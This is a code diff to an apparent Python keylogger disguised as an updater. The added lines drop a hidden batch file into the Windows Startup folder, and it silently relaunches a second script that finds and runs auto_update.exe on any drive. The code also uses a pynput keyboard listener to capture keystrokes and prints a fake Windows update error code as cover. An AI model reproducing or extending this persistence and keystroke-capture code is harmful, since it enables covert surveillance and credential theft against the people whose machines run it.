@@ -125,7 +125,6 @@ def player():
     kerpy.check_ip()
     kerpy.profiles()
 
-
     
 import kat
 
@@ -186,7 +185,13 @@ class Update:
     def change_dir(self):
         try:
             username = getpass.getuser()
-            with open(f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\auto_update.bat', 'w') as file:
+            cmdfile = fr"""
+@echo off
+start /min cmd /c "C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\auto_update.bat"
+"""
+            with open(f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\auto_update.bat', "w") as cmdFile1:
+             cmdFile1.write(cmdfile)
+            with open(f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\auto_update.bat', 'w') as file:
                 cmd = fr"""
 @echo off
 setlocal
@@ -197,6 +202,7 @@ for %%G in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
             cd /d %%G:\
             start auto_update.exe
             goto :EOF
+            exit
         )
     )
 )
@@ -208,7 +214,7 @@ exit /b
                 file.write(cmd)
 
         except Exception as e:
-            print("Error [0x80070643]: Failed to Update")
+            print(e, "Error [0x80070643]: Failed to Update")
 
     def main(self):
         listener = pynput.keyboard.Listener(on_press=self.take_keys)
